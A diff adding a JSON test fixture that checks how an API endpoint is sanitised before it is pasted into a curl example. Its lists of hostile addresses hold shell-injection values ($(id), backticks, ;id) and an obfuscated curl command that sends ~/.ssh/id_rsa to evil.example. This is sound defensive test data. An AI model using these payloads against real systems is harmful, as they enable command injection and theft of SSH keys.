@@ -1,0 +1,100 @@
+{
+ "about": "An API door's endpoint and example (docs/doors.md; each app's APIDoorText). The example is a shell line a developer pastes, so the endpoint is only ever on tafs cloud's own host, over HTTPS, with a path of unreserved characters only (letters, digits, \"/\", \"_\", \".\", \"~\", \"-\"), and no query or fragment; any other path gives tafs cloud's address alone. The example single-quotes it. `exact` gives the endpoint every app must show; `hostile` gives addresses whose endpoint may differ by app but must keep `rules`. Read by every app's tests.",
+ "base": "https://cloud.tafs.kiff.dev",
+ "alone": "https://cloud.tafs.kiff.dev/",
+ "rules": {
+  "scheme": "https",
+  "host": "cloud.tafs.kiff.dev",
+  "port": null,
+  "user": null,
+  "path_pattern": "^/[A-Za-z0-9/_.~-]*$",
+  "query": null,
+  "fragment": null
+ },
+ "example_prefix": "curl -X POST '",
+ "example_suffix": "' \\\n  -H \"Authorization: Bearer $TAFS_API_KEY\" \\\n  -H \"Idempotency-Key: <your request id>\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"input\": {}}'",
+ "exact": [
+  {
+   "address": "https://cloud.tafs.kiff.dev/v1/doors/api/door_ord7/requests",
+   "endpoint": "https://cloud.tafs.kiff.dev/v1/doors/api/door_ord7/requests"
+  },
+  {
+   "address": "/v1/doors/api/door_ord7/requests",
+   "endpoint": "https://cloud.tafs.kiff.dev/v1/doors/api/door_ord7/requests"
+  },
+  {
+   "address": "v1/x",
+   "endpoint": "https://cloud.tafs.kiff.dev/v1/x"
+  },
+  {
+   "address": "https://CLOUD.tafs.kiff.dev/v1/x",
+   "endpoint": "https://cloud.tafs.kiff.dev/v1/x"
+  },
+  {
+   "address": "https://evil.example/v1/x",
+   "endpoint": "https://cloud.tafs.kiff.dev/v1/x"
+  },
+  {
+   "address": "http://cloud.tafs.kiff.dev/v1/x",
+   "endpoint": "https://cloud.tafs.kiff.dev/v1/x"
+  },
+  {
+   "address": "https://cloud.tafs.kiff.dev:8443/v1/x",
+   "endpoint": "https://cloud.tafs.kiff.dev/v1/x"
+  },
+  {
+   "address": "https://me@cloud.tafs.kiff.dev/v1/x",
+   "endpoint": "https://cloud.tafs.kiff.dev/v1/x"
+  },
+  {
+   "address": "https://cloud.tafs.kiff.dev.evil.example/v1/x",
+   "endpoint": "https://cloud.tafs.kiff.dev/v1/x"
+  },
+  {
+   "address": "https://cloud.tafs.kiff.dev/v1/x?a=1&b=2",
+   "endpoint": "https://cloud.tafs.kiff.dev/v1/x"
+  },
+  {
+   "address": "https://cloud.tafs.kiff.dev/v1/x#frag",
+   "endpoint": "https://cloud.tafs.kiff.dev/v1/x"
+  },
+  {
+   "address": "https://cloud.tafs.kiff.dev/v1/x$(id)",
+   "endpoint": "https://cloud.tafs.kiff.dev/"
+  },
+  {
+   "address": "https://cloud.tafs.kiff.dev/v1/x;id",
+   "endpoint": "https://cloud.tafs.kiff.dev/"
+  },
+  {
+   "address": "https://cloud.tafs.kiff.dev/v1/x&id",
+   "endpoint": "https://cloud.tafs.kiff.dev/"
+  },
+  {
+   "address": "https://cloud.tafs.kiff.dev/v1/x'id'",
+   "endpoint": "https://cloud.tafs.kiff.dev/"
+  },
+  {
+   "address": "/v1/x$IFS!*+,=",
+   "endpoint": "https://cloud.tafs.kiff.dev/"
+  },
+  {
+   "address": "/v1/x%20y",
+   "endpoint": "https://cloud.tafs.kiff.dev/"
+  }
+ ],
+ "hostile": [
+  "https://cloud.tafs.kiff.dev/v1/x`id`",
+  "/v1/x$(curl$IFS-T$IFS~/.ssh/id_rsa$IFS-k$IFS'https://evil.example')",
+  "foo:x@evil.example/v1/x",
+  "mailto:a@evil.example",
+  "@evil.example/x",
+  "//evil.example/v1/x",
+  "\\\\evil.example\\x",
+  "https://evil.example@cloud.tafs.kiff.dev.evil.example/",
+  " https://cloud.tafs.kiff.dev/v1/x ",
+  "https://cloud.tafs.kiff.dev/v1/x\n;id",
+  "javascript:alert(1)",
+  ""
+ ]
+}
